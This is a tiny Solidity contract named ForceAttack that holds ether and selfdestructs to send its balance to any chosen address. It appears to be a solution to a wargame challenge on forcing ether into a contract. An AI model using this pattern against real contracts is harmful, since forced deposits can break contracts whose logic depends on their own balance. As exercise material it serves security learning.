// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract ForceAttack {
    constructor() payable {}

    function destruct(address payable _address) public {
        selfdestruct(_address);
    }
}
